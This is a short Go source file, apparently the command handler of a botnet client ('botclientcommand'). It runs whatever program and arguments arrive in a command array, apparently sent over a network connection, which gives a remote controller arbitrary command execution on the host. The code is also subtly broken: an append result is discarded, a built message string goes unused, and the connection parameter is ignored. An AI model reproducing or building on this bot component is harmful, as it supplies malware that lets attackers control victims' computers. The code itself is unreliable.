package botclientcommand

import (
	m "Misc"
	"net"
	"os/exec"
)

func cmd(command []string, cc net.Conn) {
	var fullcommand []string
	for i := 1; i < len(command); i++ {
		_ = append(fullcommand, command[i])
	}

	msg := ""
	for _, com := range command {
		msg = msg + " " + com
	}

	c := exec.Command(command[1], command[2:]...)
	if err := c.Run(); err != nil {
		m.Warning("Cannot Run Command", err)
	}
}
